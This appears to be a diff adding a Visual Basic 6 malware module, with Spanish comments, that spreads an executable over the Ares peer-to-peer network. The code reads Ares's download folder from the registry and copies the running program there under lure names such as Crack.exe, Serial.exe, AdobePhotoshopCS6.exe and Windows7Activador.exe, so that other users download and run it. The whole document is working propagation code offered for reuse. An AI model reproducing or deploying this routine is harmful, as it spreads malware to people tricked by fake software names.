@@ -1,0 +1,40 @@
+'/**********************************************\
+'/ Autor: k0ws                                 *\
+'/ Webs: Underc[0]de.org & Udtools.net         *\
+'/ Funcion: Propagar ejecutable via Ares       *\
+'/ Anexo: El autor se exime de su mal uso      *\
+'/ Uso: Call sAres()                           *\
+'/ Si usas este o parte del codigo da creditos *\
+'/**********************************************\
+ 
+Public Function sAres()
+'Por si las moscas x)
+On Error GoTo erroneo
+'Definimos lo necesario (Rutas,nombres y el contador)
+Dim n As Integer
+Dim lector, ruta As String, rutaCom As String, listaNombres As String, nombresF() As String
+'Leemos la ruta donde Ares guarda las descargas y la convertimos de Hexadecimal a Texto
+Set lector = CreateObject("wscript.shell")
+ruta = lector.RegRead("HKEY_CURRENT_USER\SOFTWARE\Ares\Download.Folder")
+rutaCom = sConvert(ruta)
+'Lista de nombres para autocopiarnos
+listaNombres = "Crack.exe,Serial.exe,Winrar.exe,Winzip.exe,PhotoScape.exe,LiveMessenger2012.exe," _
+& "DiabloIII.exe,DriverPackSolution.exe,MicrosoftOffice2010.exe,AdobePhotoshopCS6.exe,Activador.exe" _
+& ",WindowsXPActivador.exe,Windows7Activador.exe"
+'Nos copiammos usando un pequeño contador para el split ;)
+For n = 0 To 12
+nombresF() = Split(listaNombres, ",")
+FileCopy App.Path & "\" & App.EXEName & ".exe", rutaCom & "\" & nombresF(n)
+Next
+erroneo:
+End
+End Function
+ 
+Public Function sConvert(ByVal hextext As String) As String 'Funcion para convertir Hexadecimal a exto
+    For y = 1 To Len(hextext)
+    num = Mid(hextext, y, 2)
+    Value = Value & Chr(Val("&h" & num))
+    y = y + 1
+Next y
+sConvert = Value
+End Function
